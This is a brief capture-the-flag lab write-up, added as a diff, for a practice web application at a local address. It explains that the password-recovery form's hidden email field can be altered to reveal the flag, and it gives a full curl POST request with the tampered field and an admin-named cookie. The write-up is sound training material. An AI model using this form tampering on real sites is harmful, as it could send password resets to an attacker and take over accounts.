@@ -1,0 +1,7 @@
+Recover page send a bunch of information in the body when we click the button.
+
+page=recover#mail=webmaster%40borntosec.com&Submit=Submit
+
+if we change them, we get the flag.
+
+curl 'http://192.168.56.101/index.php?page=recover#' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.56.101' -H 'Connection: keep-alive' -H 'Referer: http://192.168.56.101/index.php?page=recover' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --data-raw 'mail=webmasr%40borntosec.com&Submit=Submit' | grep flag
